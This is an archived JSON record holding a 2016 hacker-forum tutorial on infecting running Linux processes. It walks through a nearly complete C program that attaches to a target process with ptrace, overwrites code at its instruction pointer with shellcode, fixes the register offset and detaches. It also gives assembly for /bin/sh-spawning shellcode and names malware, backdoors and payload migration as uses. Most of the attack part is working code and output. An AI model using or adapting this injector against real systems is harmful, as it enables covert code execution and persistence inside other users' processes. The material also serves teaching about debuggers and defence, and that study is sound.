{
    "id": "b6fe931a-3c41-4321-bf9c-855883884edf",
    "created_at": "2023-01-12T15:06:17.231331Z",
    "updated_at": "2025-03-27T02:09:29.789892Z",
    "deleted_at": null,
    "sha1_hash": "f4f90459a9ac0fda61ad41998212ca3bc18f8912",
    "title": "Infecting Running Processes",
    "authors": "",
    "file_creation_date": "2021-03-08T01:08:11Z",
    "file_modification_date": "2021-03-08T01:08:11Z",
    "file_size": 129030,
    "plain_text": "# [Linux] Infecting Running Processes\n\n**0x00sec.org/t/linux-infecting-running-processes/1097**\n\n[0x00pfpico](https://0x00sec.org/u/0x00pf)\n\n\nSeptember 16, 2016\n\n\nWe have already seen how to infect a file injecting code into the binary so it gets executed\nnext time the infected program is started. But, how to infect a process that is already\nrunning?. Well, this paper will introduce the basic techniques you need to learn in order to\nfiddle with other processes in memory… In other words, it will introduce you to the basics of\nhow to write your own debugger.\n\n## Use Cases\n\nBefore going into the gory details, let’s introduce a couple of situations that may benefit of\nbeing able to inject code on a running program.\n\nThe very first use case is not really malware related and has been a matter of research for\nmany years: Run-time patching. There are systems that cannot be switched off, or, in other\nwords, switching them off will cost a lot of money. For that reason, being able to apply\npatches or updates to running process (without even restarting the application) was an hot\nproblem some years ago. Nowadays the cloud/VM paradigm have solved the problem in a\ndifferent way and this “SW hot-swapping” is not that popular anymore.\n\nThe other main benign use case is the development of debuggers and reverse engineering\ntools. Look for instance to radare2… you will learn the basics of how it works in this paper.\n\nOther use case is obviously the development of malware. Virus, backdoors, etc… I guess there\nare a lot of uses in here that I cannot even imagine. One use case, many of you may know is\nthe meterpreter process migration capability. That function that moves your payload into a\ninnocent running program.\n\nIf you had read some of my papers before, you will know that I’m going to talk about Linux.\nThe basic concepts should be very similar in other operating systems, so I hope this may be\nuseful even if you are not a Linux user.\n\nEnough of introduction let’s get to the code\n\n## Process Debugging in Linux\n\nTechnically speaking, the way to access another process and modify it is through the\ndebugging interfaces provided by the operating systems. The debug system call on Linux is\nnamed `ptrace .` `Gdb,` `radare2,` `ddd,` `strace all those tools use` `ptrace in order to`\n\n\n-----\n\nbe able to provide their services.\n\nThe `ptrace system call allows a process to debug another process. Using` `ptrace we will`\nbe able to stop a target process execution and examine the values of its registers and memory\nas well as change them to whatever value we want.\n\nThere are two ways to start debugging a process. The first and more immediate one, is to\nmake our `debugger start the process…` `fork and` `exec . This is what happens when you`\npass a program name as a parameter to `gdb or` `strace .`\n\nThe other option we have is to dynamically attach our debugger to a running process.\n\nFor this paper we will concentrate on the second one. Whenever you get familiar enough with\nthe basics you will not have any problem to find the details on how to start a process yourself\nto debug it.\n\n## Attaching to a running process\n\nThe first thing we have to do in order to modify a running process is to start debugging it.\nThis process is called `attach and actually that is the name of the` `gdb command to do`\nwhat we are about to see in the code:\n\n\n-----\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n#include <sys/ptrace.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <unistd.h>\n#include <sys/user.h>\n#include <sys/reg.h>\nint\nmain (int argc, char *argv[])\n{\n pid_t          target;\n struct user_regs_struct regs;\n int           syscall;\n long          dst;\n if (argc != 2)\n  {\n   fprintf (stderr, \"Usage:\\n\\t%s pid\\n\", argv[0]);\n   exit (1);\n  }\n target = atoi (argv[1]);\n printf (\"+ Tracing process %d\\n\", target);\n if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)\n  {\n   perror (\"ptrace(ATTACH):\");\n   exit (1);\n  }\n printf (\"+ Waiting for process...\\n\");\n wait (NULL);\n\n```\nIn the code above, you can see the typical main function expecting one parameter. In this\ncase the parameter is the `PID (Process IDentifier) for the process we want to modify. We`\nwill be using this parameter in each single `ptrace call, so we better store it somewhere`\n( target variable).\n\nThen we just call `ptrace using as first parameter` `PTRACE_ATTACH, and as second`\nparameter the `pid of the process we want to get attached to. After that, we have to call`\n```\nwait to wait for the SIGTRAP signal indicating that the attaching process is completed.\n\n```\nAt this point, the process we are connected to is stopped, and we can start modifying it at\nwill.\n\n## Injecting code\n\n\n-----\n\nFirst we have to decide where do we want our code injected. There are quite some\npossibilities:\n\nWe can just inserted at the current instruction being executed. This is very straight\nforward but it destroys the target process, making impossible recovering its original\nfunctionality.\nWe can try to inject the code at the address where the `main function is located. There`\nare chances that the code there contains some initialization that only happens at the\nbeginning of the execution, and therefore we may keep the original functionality\nworking as expected.\nAnother option is to use one of the ELF infection techniques, and inject the code, for\ninstance, is a code cave in memory\nFinally, we can inject the code in the stack, as a normal buffer overflow. This is pretty\nsafe to avoid destroying the program, but the process may be protected with a nonexecutable stack.\n\nFor the sake of simplicity, we are going to inject the code just at the position of the\nInstruction Pointer ( rip register for x86 64bits) when we get control of the process. As you\nwill see in a sec, the code we are injecting is the typical shellcode starting a shell session, and\ntherefore we are not expecting to give control back to the original process. In other words, it\ndoes not matter if we destroy part of the program.\n\n## Get the Registers and Smash the Memory\n\nThis is the code to inject the code in the process under control:\n```\n printf (\"+ Getting Registers\\n\");\n if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)\n  {\n   perror (\"ptrace(GETREGS):\");\n   exit (1);\n  }\n printf (\"+ Injecting shell code at %p\\n\", (void*)regs.rip);\n inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);\n regs.rip += 2;\n\n```\nThe first thing we find in this code is a call to `ptrace with parameter` `PTRACE_GETREGS .`\nThis call allows our program to retrieve the values of the registers from the process under\ncontrol.\n\nAfter that, we use a function to inject our shellcode in the target process. Note that we are\ntaking the value of `regs.rip that actually contains the current Instruction Pointer register`\nvalue from the target process. The `inject_data function, as you can imagine, just copy our`\nshellcode into the address pointed by `reg.rip but in the target process.`\n\nLet’s see how\n\n\n-----\n\n```\nint\ninject_data (pid_t pid, unsigned char *src, void *dst, int len)\n{\n int   i;\n uint32_t *s = (uint32_t *) src;\n uint32_t *d = (uint32_t *) dst;\n for (i = 0; i < len; i+=4, s++, d++)\n  {\n   if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)\n     {\n      perror (\"ptrace(POKETEXT):\");\n      return -1;\n     }\n  }\n return 0;\n}\n\n```\nVery simple isn’t it?. There are only two things we have to comment about this function:\n\n1. `PTRACE_POKETEXT is used to write in the memory of the process being debugged. This`\n\nis how we actually inject the code in the target process. There is a `PTRACE_PEEKTEXT`\nalso.\n2. The `PTRACE_POKETEXT function works on words, so we convert everything to word`\n\npointers (32bits) and we also increase `i by 4.`\n\n## Running the injected code\n\nNow that the target process memory has been modified to contain the code we want to run\nwe just need to give control back to the process and let it keep running. This can be done in a\ncouple of different ways. In this case we will just `detach the target process, that is, we stop`\ndebugging the target process. This action effectively stops the debug session and continues\nthe execution of the target process:\n```\n printf (\"+ Setting instruction pointer to %p\\n\", (void*)regs.rip);\n if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)\n  {\n   perror (\"ptrace(GETREGS):\");\n   exit (1);\n  }\n printf (\"+ Run it!\\n\");\n if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)\n     {\n      perror (\"ptrace(DETACH):\");\n      exit (1);\n     }\n return 0;\n}\n\n```\n\n-----\n\nThis should also be pretty straightforward to understand. You may have notice that we are\nsetting the registers back, before `detaching . OK. Go back to the previous section for a`\nwhile and check how do we inject the code… Do you see that `regs.rip +=2 line there.`\n\nYes, we had modified the instruction pointer, and that is the reason why we have to set the\nregisters on the target process, before giving the control back. What happens is that, the\n```\nPTRACE_DEATCH subtracts 2 bytes to the Instruction Pointer.\n\n## How to figure out those 2 bytes\n\n```\nThose 2 bytes subtracted from `RIP when calling` `PTRACE_DEATCH were a tricky thing to`\nfigure out. I’ll tell you how I did it, in case you wonder.\n\nDuring testing, the target program was crashing when I tried to inject code in the stack. One\nreason was that the stack was not executable for my target program. I fixed that using the\n```\nexecstack tool. But the problem also happened when injecting code in memory regions\n\n```\nwith execution permissions. So I activated the core dump and analysed what happened.\n\nThe reason is that, you cannot run `gdb against the target program, otherwise our very first`\n```\nptrace call will fail. Yes, you cannot debug the same program with two debuggers at the\n\n```\nsame time (this sentence hides a common anti-debugging technique ). So, what I’ve got when\ntrying to inject code in the stack was this.\n\nThe output of the injector was:\n```\n+ Tracing process 15333\n+ Waiting for process...\n+ Getting Registers\n+ Injecting shell code at 0x7ffe9a708728\n+ Setting instruction pointer to 0x7ffe9a708708\n+ Run it!\n\n```\nOf course all the addresses and PIDs will be different in your system. Anyway, this produced\na core dump on the target that we can open with `gdb to check what happened.`\n```\n$ gdb ./target core\n(... gdb start up messages removed ...)\nReading symbols from ./target...(no debugging symbols found)...done.\n[New LWP 15333]\nCore was generated by `./target'.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0 0x00007ffe9a708706 in ?? ()\n\n```\nWhat you see there is the address that caused the segmentation fault. If you compare it with\nthe address reported by the injector you can see the 2 bytes difference. Fixing that and the\nstack permissions made the injector work fine.\n\n## Testing Program\n\n\n-----\n\nIn order to test this concept I wrote a very simple program. It just prints its `pid (so I do not`\nhave to look for it), and then writes 10 times a message in the screen waiting 2 seconds\nbetween messages. This gives you time to launch the injector.\n```\n#include <stdio.h>\n#include <unistd.h>\nint main()\n{  \n  int i;\n  printf (\"PID: %d\\n\", (int)getpid());\n  for(i = 0;i < 10; ++i) {\n     write (1, \"Hello World\\n\", 12);\n    sleep(2);\n  }\n  getchar();\n  return 0;\n}\n\n```\nThe shellcode I used was produced from this simple assembler file:\n```\nsection .text\n    global _start\n_start:\n    xor rax,rax\n    mov rdx,rax       ; No Env\n    mov rsi,rax       ; No argv\n    lea rdi, [rel msg]\n    add al, 0x3b\n    syscall\n    msg db '/bin/sh',0\n\n## Final Word\nptrace is a very powerful tool. In this paper we have just shown the very basics. Now it is a\n\n```\ngood time to fire up your terminal and type `man ptrace to learn about the wonders of this`\nsystem call.\n\nYou may try a couples of things yourself, in case you are interested:\n\nModify the injector to feed the code in a code cave\nUse more sophisticated shellcodes that forks a process and keeps the original program\nrunning\n\n\n-----\n\nYour shellcode will be running on the target project and will have access to all open\nfiles…\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Process Injection/Infecting Running Processes.pdf"
    ],
    "report_names": [
        "Infecting Running Processes.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535977,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1615165691,
    "ts_modification_date": 1615165691,
    "files": {
        "pdf": "https://archive.orkl.eu/f4f90459a9ac0fda61ad41998212ca3bc18f8912.pdf",
        "text": "https://archive.orkl.eu/f4f90459a9ac0fda61ad41998212ca3bc18f8912.txt",
        "img": "https://archive.orkl.eu/f4f90459a9ac0fda61ad41998212ca3bc18f8912.jpg"
    }
}